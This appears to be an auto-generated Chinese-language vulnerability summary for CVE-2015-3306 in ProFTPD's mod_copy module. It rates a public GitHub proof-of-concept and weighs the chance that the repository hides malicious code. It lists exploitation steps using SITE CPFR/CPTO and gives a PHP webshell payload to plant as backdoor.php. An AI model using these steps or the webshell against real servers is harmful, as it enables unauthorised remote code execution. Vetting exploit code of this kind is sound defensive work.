## CVE-2015-3306 ProFTPD mod_copy 模块任意文件读写漏洞

**漏洞编号:** CVE-2015-3306

**漏洞类型:** 任意文件读写

**影响应用:** ProFTPD

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 1.3.5 及更早版本

**利用条件:** 目标服务器运行 ProFTPD 1.3.5 及更早版本，且启用了 mod_copy 模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2015-3306 漏洞存在于 ProFTPD 1.3.5 及其早期版本的 mod_copy 模块中。该漏洞允许未经身份验证的远程攻击者通过 `SITE CPFR` 和 `SITE CPTO` 命令读取和写入服务器上的任意文件。 

**有效性：**

提供的 Python POC 代码通过 `SITE CPFR` 和 `SITE CPTO` 命令，先将包含 PHP 代码的 payload 写入临时文件，然后将该临时文件复制到 Web 目录，从而创建一个 PHP 后门。之后，可以通过 HTTP 请求执行任意命令。

从搜索引擎结果和漏洞库信息来看，该漏洞已经公开，并且存在可用的利用代码，因此漏洞利用是有效的。

**投毒风险：**

代码仓库中可能存在的投毒风险点分析：

*   **LICENSE 文件:** MIT 许可证允许自由使用、复制、修改和分发代码。恶意代码可能被隐藏在修改后的版本中。
*   **README.md 文件:**  该文件描述了漏洞和利用方法，通常不会包含恶意代码。
*   **exploit.py 文件:** 这是主要利用脚本。潜在的投毒点可能包括：
    *   修改了目标路径，指向攻击者控制的服务器。
    *   添加了额外的网络请求，向攻击者发送敏感信息。
    *   在执行命令之前或之后，执行恶意操作。
    *   后门代码如果被修改，可能会存在反弹shell或者其他恶意功能，比如安装挖矿程序，删除日志等等，如果被植入，可能导致非常严重的后果。
    *   代码中使用了 `requests` 库，这是一个潜在的风险点，因为可以通过修改请求来执行恶意操作。例如,将执行结果回传到攻击者的服务器。
*   **综合评估：** 虽然代码本身实现了漏洞利用，但仍存在一定投毒风险，比如修改了默认的路径，或在原始命令执行后追加执行恶意命令。因此，在使用前务必仔细审查代码。投毒风险评估为 10%。

**利用方式：**

1.  **连接到目标 ProFTPD 服务器。**
2.  **使用 `SITE CPFR /proc/self/cmdline` 命令读取 ProFTPD 进程的命令行参数。**
3.  **构造包含 PHP 代码的 Payload，例如 `<?php echo passthru($_GET['cmd']); ?>`。**
4.  **使用 `SITE CPTO /tmp/.<payload>` 命令将 Payload 写入临时文件。**
5.  **使用 `SITE CPFR /tmp/.<payload>` 命令读取临时文件。**
6.  **使用 `SITE CPTO <webroot>/backdoor.php` 命令将临时文件复制到 Web 目录，创建 PHP 后门。**
7.  **通过 HTTP 请求访问后门，并执行任意命令，例如 `http://<target>/backdoor.php?cmd=whoami`。**

该漏洞利用需要目标服务器开启了 mod_copy 模块，并且攻击者需要知道 Web 目录的路径。

**项目地址:** [donmedfor/CVE-2015-3306](https://github.com/donmedfor/CVE-2015-3306)

**漏洞详情:** [CVE-2015-3306](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)